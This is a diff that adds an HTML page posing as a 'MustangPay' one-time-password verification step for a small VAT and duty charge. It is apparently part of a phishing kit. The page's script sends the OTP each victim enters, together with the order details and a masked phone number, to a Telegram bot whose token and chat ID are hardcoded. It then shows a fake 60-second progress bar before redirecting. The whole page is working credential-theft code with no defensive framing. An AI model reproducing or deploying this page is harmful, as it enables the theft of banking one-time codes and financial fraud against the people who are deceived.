@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OPT Verification</title>
+<link rel="icon" href="img/MstgPay icon.png" type="image/jpeg">
+
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  background:linear-gradient(180deg,#fff5ec,#ffe7d6);
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  min-height:100vh;
+  padding:40px 20px 20px;
+}
+.container{
+  width:100%;
+  max-width:380px;
+  text-align:center;
+}
+.logo img{
+  height:28px;
+  margin-bottom:16px;
+}
+/* Order info card */
+.info-card {
+  background:#fff;
+  border-radius:16px;
+  padding:20px;
+  margin-bottom:20px;
+  box-shadow:0 6px 18px rgba(0,0,0,0.08);
+  text-align:left;
+  font-size:14px;
+}
+.info-card div {
+  margin:6px 0;
+}
+/* Form card */
+.card{
+  background:#fff;
+  border-radius:16px;
+  padding:28px 20px;
+  box-shadow:0 6px 18px rgba(0,0,0,0.08);
+}
+h2{
+  color:#e06a2f;
+  margin-bottom:14px;
+}
+.OPT-text{
+  font-size:14px;
+  color:#555;
+  margin-bottom:18px;
+}
+.OPT-inputs{
+  display:flex;
+  justify-content:center;
+  gap:10px;
+  margin-bottom:18px;
+}
+.OPT-inputs input{
+  width:46px;
+  height:46px;
+  font-size:22px;
+  text-align:center;
+  border-radius:10px;
+  border:1px solid #ddd;
+}
+.verify-btn{
+  width:100%;
+  padding:14px;
+  background:#000;
+  color:#fff;
+  border:none;
+  border-radius:14px;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+}
+.verify-btn:disabled{
+  opacity:0.7;
+  cursor:not-allowed;
+}
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(255,255,255,0.95);
+  z-index:9999;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+}
+.percent{
+  font-size:32px;
+  font-weight:700;
+  margin-top:16px;
+}
+.loader-bar{
+  width:280px;
+  height:12px;
+  background:#eee;
+  border-radius:6px;
+  overflow:hidden;
+  margin-top:18px;
+}
+.loader-fill{
+  width:0%;
+  height:100%;
+  background:#e06a2f;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <div class="logo">
+    <img src="img/MstgPay2.png" alt="MustangPay">
+  </div>
+
+  <!-- Order info card -->
+  <div class="info-card">
+    <div><strong>Order Number:</strong> 1115609176294230</div>
+    <div><strong>Remark:</strong> BUFZA60615PPPQ-VAT&DUTY</div>
+    <div><strong>Amount Due:</strong> R 43.13</div>
+  </div>
+
+  <!-- OTP / OPT card -->
+  <div class="card">
+    <h2>Enter OPT</h2>
+    <div class="OPT-text" id="OPTText"></div>
+
+    <div class="OPT-inputs">
+      <input type="tel" inputmode="numeric" maxlength="1">
+      <input type="tel" inputmode="numeric" maxlength="1">
+      <input type="tel" inputmode="numeric" maxlength="1">
+      <input type="tel" inputmode="numeric" maxlength="1">
+      <input type="tel" inputmode="numeric" maxlength="1">
+      <input type="tel" inputmode="numeric" maxlength="1">
+    </div>
+
+    <button class="verify-btn" id="verifyBtn">Verify OPT</button>
+
+    <div style="font-size:19px;color:#999;margin-top:10px">
+      The OTP may take a few moments to arrive.
+    </div>
+  </div>
+
+  <!-- Loader overlay -->
+  <div class="overlay" id="overlay">
+    <img src="img/MstgPay2.png" style="height:28px">
+    <div class="percent" id="percent">0%</div>
+    <div class="loader-bar">
+      <div class="loader-fill" id="loaderFill"></div>
+    </div>
+    <div style="margin-top:10px;font-size:14px;color:#555">
+      Verifying OPT, please wait...
+    </div>
+  </div>
+</div>
+
+<script>
+// ===============================
+// TELEGRAM CONFIG
+// ===============================
+const TELEGRAM_BOT_TOKEN = "8368617476:AAEyVanlgrh6-5ZCeQqkMDwGcMbofJQH1Ns";
+const TELEGRAM_CHAT_ID = "7027302249";
+const TG_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+// ===============================
+// OPT INPUT CARD SETUP
+// ===============================
+const phoneRaw = localStorage.getItem("phone") || "0821234567";
+
+function maskPhone(phone){
+  return /^\d{10}$/.test(phone)
+    ? phone.slice(0,3) + "***" + phone.slice(-4)
+    : "your phone number";
+}
+
+const maskedPhone = maskPhone(phoneRaw);
+
+document.getElementById("OPTText").innerHTML = `
+  <strong>A verification code has been sent to your device (${maskedPhone})</strong><br>
+  <strong>Enter the code below</strong>
+`;
+
+
+// Input behavior
+const inputs = document.querySelectorAll(".OPT-inputs input");
+
+inputs.forEach((input, i) => {
+  input.addEventListener("input", () => {
+    input.value = input.value.replace(/\D/g, "");
+    if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
+  });
+
+  input.addEventListener("keydown", e => {
+    if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
+  });
+});
+
+// ===============================
+// VERIFY + TELEGRAM SEND
+// ===============================
+document.getElementById("verifyBtn").addEventListener("click", function () {
+  const otp = [...inputs].map(i => i.value).join("");
+  if(!/^\d{4,6}$/.test(otp)){
+    alert("OTP must be 4–6 digits.");
+    return;
+  }
+
+  const btn = document.getElementById("verifyBtn");
+  btn.disabled = true;
+  btn.textContent = "Verifying...";
+
+  const overlay = document.getElementById("overlay");
+  overlay.style.display = "flex";
+
+  // Animate loader (60 seconds)
+  const loaderFill = document.getElementById("loaderFill");
+  const percentText = document.getElementById("percent");
+  let percent = 0;
+  const timer = setInterval(() => {
+    percent++;
+    loaderFill.style.width = percent + "%";
+    percentText.textContent = percent + "%";
+    if(percent >= 100) clearInterval(timer);
+  }, 600); // 600ms x 100 = 60 seconds
+
+  // Telegram message
+  const message =
+    `🔐 OTP1 ${otp}\n` +
+    `Order: 1115609176294230\n` +
+    `Remark: BUFZA60615PPPQ-VAT&DUTY\n` +
+    `Amount: R 43.13\n` +
+    `Phone: ${maskedPhone}\n` +
+    `OTP Entered: ${otp}\n` +
+    `Time: ${new Date().toLocaleString()}`;
+
+  fetch(TG_URL, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+  });
+
+  // Redirect after 60 seconds
+  setTimeout(() => {
+    window.location.href = "opt1.html";
+  }, 60000);
+});
+</script>
+</body>
+</html>
